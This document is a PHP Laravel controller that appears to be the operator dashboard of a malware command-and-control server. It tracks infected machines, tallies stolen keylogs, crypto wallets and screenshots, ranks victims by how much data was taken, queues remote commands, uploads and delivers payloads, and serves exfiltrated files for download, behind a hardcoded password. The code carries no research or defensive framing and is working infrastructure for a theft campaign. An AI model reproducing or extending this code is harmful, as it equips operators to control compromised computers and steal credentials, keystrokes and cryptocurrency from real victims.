<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Services\C2Service;

class AdminController extends Controller
{
    private $c2Service;

    public function __construct(C2Service $c2Service)
    {
        $this->c2Service = $c2Service;
    }

    public function index(Request $request)
    {
        // Simple password check (middleware is better, but mirroring original logic)
        $password = $request->query('password');
        if ($password !== '54321') {
            return view('admin.login', ['error' => $password ? true : false]);
        }

        $this->c2Service->cleanupTerminals();
        $terminalsRaw = $this->c2Service->getOnlineTerminals();
        
        $terminals = [];
        $totalTerminals = count($terminalsRaw);
        $onlineTerminals = 0;
        $offlineTerminals = 0;
        $totalKeylogs = 0;
        $totalWallets = 0;
        $totalScreenshots = 0;
        
        // Arrays for chart data
        $osDistribution = [];
        $uptimeDistribution = ['24h+' => 0, '12-24h' => 0, '6-12h' => 0, '1-6h' => 0, '<1h' => 0];
        $topTargets = [];
        
        foreach ($terminalsRaw as $t) {
             $timeSince = time() - $t['last_seen'];
             $isOnline = $timeSince < 60;
             if ($isOnline) $onlineTerminals++; else $offlineTerminals++;
             
             // Append derived data
             $t['is_online'] = $isOnline;
             $t['time_since'] = $timeSince;
             $dataInfo = $this->c2Service->getTerminalDataCollectionInfo($t['id']);
             $t['data_info'] = $dataInfo;
             
             // Accumulate totals
             $totalKeylogs += $dataInfo['keylogs'] ?? 0;
             $totalWallets += $dataInfo['crypto_wallets'] ?? 0;
             $totalScreenshots += $dataInfo['screenshots'] ?? 0;
             
             // Only add online terminals to list
             if ($isOnline) {
                 $terminals[] = $t;
                 
                 // OS Distribution
                 $os = $t['os'] ?? 'Unknown';
                 if (!isset($osDistribution[$os])) {
                     $osDistribution[$os] = 0;
                 }
                 $osDistribution[$os]++;
                 
                 // Uptime Distribution
                 $hours = $timeSince / 3600;
                 if ($hours >= 24) $uptimeDistribution['24h+']++;
                 elseif ($hours >= 12) $uptimeDistribution['12-24h']++;
                 elseif ($hours >= 6) $uptimeDistribution['6-12h']++;
                 elseif ($hours >= 1) $uptimeDistribution['1-6h']++;
                 else $uptimeDistribution['<1h']++;
                 
                 // Top Targets (by total data)
                 $totalData = ($dataInfo['keylogs'] ?? 0) + ($dataInfo['screenshots'] ?? 0) + ($dataInfo['crypto_wallets'] ?? 0);
                 $topTargets[] = [
                     'id' => substr($t['id'], 0, 8),
                     'hostname' => $t['hostname'] ?? 'Unknown',
                     'data' => $totalData
                 ];
             }
        }
        
        // Sort and limit top targets
        usort($topTargets, function($a, $b) {
            return $b['data'] - $a['data'];
        });
        $topTargets = array_slice($topTargets, 0, 5);
        
        // Get chart data from service
        $networkProtocols = $this->c2Service->getNetworkProtocolDistribution();
        $activityTimeline = $this->c2Service->getActivityTimeline24h();
        $securityEvents = $this->c2Service->getSecurityEventsData();

        return view('admin.dashboard', compact(
            'terminals', 
            'totalTerminals', 
            'onlineTerminals', 
            'offlineTerminals',
            'totalKeylogs',
            'totalWallets',
            'totalScreenshots',
            'osDistribution',
            'uptimeDistribution',
            'topTargets',
            'networkProtocols',
            'activityTimeline',
            'securityEvents'
        ));
    }

    public function clientManage($id)
    {
        // Get client details
        $client = $this->c2Service->getTerminalDetails($id);
        if (!$client) {
            abort(404, 'Client not found');
        }
        
        return view('admin.client-manage', ['clientId' => $id, 'client' => $client]);
    }

    public function sendPayload(Request $request)
    {
        $data = $request->validate([
            'terminal_id' => 'required',
            'payload_file' => 'required'
        ]);

        $this->c2Service->queuePayload($data['terminal_id'], $data['payload_file']);
        return response()->json(['status' => 'success', 'message' => 'Payload scheduled']);
    }

    public function remoteCommand(Request $request)
    {
        $data = $request->validate([
            'terminal_id' => 'required',
            'command' => 'required',
            'type' => 'required'
        ]);

        $this->c2Service->queueCommand($data['terminal_id'], $data['command'], $data['type']);
        return response()->json(['status' => 'success', 'message' => 'Command queued']);
    }

    public function webrtcExchange(Request $request)
    {
        $data = $request->validate([
             'terminal_id' => 'required',
             'candidates' => 'required'
        ]);
        
        $file = storage_path('app/c2_data/webrtc/' . $data['terminal_id'] . '_c2_candidates.json');
        file_put_contents($file, json_encode([
             'terminal_id' => $data['terminal_id'],
             'candidates' => $data['candidates'],
             'timestamp' => time()
        ]));

        return response()->json(['status' => 'success', 'message' => 'WebRTC candidates saved']);
    }
    
    public function terminalDetails(Request $request)
    {
        $id = $request->query('id');
        if (!$id) return response()->json(['error' => 'ID required'], 400);
        
        $details = $this->c2Service->getTerminalDetails($id);
        if (!$details) return response()->json(['error' => 'Not found'], 404);
        
        return response()->json(['status' => 'success', 'terminal' => $details]);
    }
    
    public function listFiles($terminalId)
    {
        $files = $this->c2Service->getExfiltratedFiles($terminalId);
        return response()->json($files);
    }
    
    public function downloadFile($terminalId, $filename)
    {
        // Security check
        if (strpos($filename, '..') !== false || strpos($filename, '/') !== false || strpos($filename, '\\') !== false) {
             abort(403);
        }
        
        $path = storage_path('app/c2_data/uploads/' . $terminalId . '/' . $filename);
        if (file_exists($path)) {
            return response()->download($path);
        }
        abort(404);
    }
    
    public function telemetryView($terminalId)
    {
        $terminal = $this->c2Service->getTerminalDetails($terminalId);
        if (!$terminal) abort(404);
        return view('admin.telemetry', compact('terminal'));
    }
    
    public function screenshotsView($terminalId)
    {
        $terminal = $this->c2Service->getTerminalDetails($terminalId);
        if (!$terminal) abort(404);
        return view('admin.screenshots', compact('terminal'));
    }
    
    public function keylogsView($terminalId)
    {
        $terminal = $this->c2Service->getTerminalDetails($terminalId);
        if (!$terminal) abort(404);
        return view('admin.keylogs', compact('terminal'));
    }
    
    public function cryptoView($terminalId)
    {
        $terminal = $this->c2Service->getTerminalDetails($terminalId);
        if (!$terminal) abort(404);
        return view('admin.crypto', compact('terminal'));
    }
    
    public function exportData($terminalId, $type)
    {
        $format = request()->query('format', 'json');
        
        if ($format === 'csv') {
            $content = $this->c2Service->exportDataAsCSV($terminalId, $type);
            return response($content)
                ->header('Content-Type', 'text/csv')
                ->header('Content-Disposition', "attachment; filename=\"terminal_{$terminalId}_{$type}.csv\"");
        } else {
            $content = $this->c2Service->exportDataAsJSON($terminalId, $type);
            return response($content)
                ->header('Content-Type', 'application/json')
                ->header('Content-Disposition', "attachment; filename=\"terminal_{$terminalId}_{$type}.json\"");
        }
    }
    
    public function uploadAndSendPayload(Request $request)
    {
        $terminalId = $request->input('terminal_id');
        
        if (!$terminalId) {
            return response()->json(['status' => 'error', 'message' => 'Terminal ID required'], 400);
        }
        
        if (!$request->hasFile('file')) {
            return response()->json(['status' => 'error', 'message' => 'No file provided'], 400);
        }
        
        $file = $request->file('file');
        
        // Create payloads directory if it doesn't exist
        $payloadDir = storage_path('app/c2_data/payloads');
        if (!is_dir($payloadDir)) {
            mkdir($payloadDir, 0755, true);
        }
        
        // Save uploaded file with unique name
        $filename = time() . '_' . $file->getClientOriginalName();
        $file->move($payloadDir, $filename);
        $filePath = $payloadDir . '/' . $filename;
        
        // Queue the payload for delivery
        $this->c2Service->queuePayload($terminalId, $filePath);
        
        return response()->json([
            'status' => 'success',
            'message' => 'Payload queued for delivery',
            'filename' => $filename
        ]);
    }
}
